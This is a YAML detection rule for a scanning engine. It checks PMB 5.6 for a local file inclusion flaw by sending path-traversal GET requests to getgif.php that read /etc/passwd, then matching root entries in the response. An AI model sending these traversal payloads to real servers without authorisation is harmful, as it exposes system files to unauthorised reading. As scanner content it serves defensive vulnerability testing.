schema_version: 1
id: "cortex.community:pmb-directory-traversal"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "PMB 5.6 - Local File Inclusion"
  description: "PMB 5.6 is vulnerable to local file inclusion because the PMB Gif Image is not sanitizing the content of the 'chemin' parameter. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://packetstormsecurity.com/files/160072/PMB-5.6-Local-File-Disclosure-Directory-Traversal.html"
  cwes: [22]
  tags: ["lfi", "packetstorm", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik" }
  - id: "probe1"
    request: { method: "GET", path: "/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik" }
proof:
  kind: "signal.v1"
  assertions:
    any:
      - all:
          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
          - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
      - all:
          - regex: { left: { ref: "steps.probe1.body" }, right: { value: "root:.*:0:0:" } }
          - eq: { left: { ref: "steps.probe1.status" }, right: { value: 200 } }
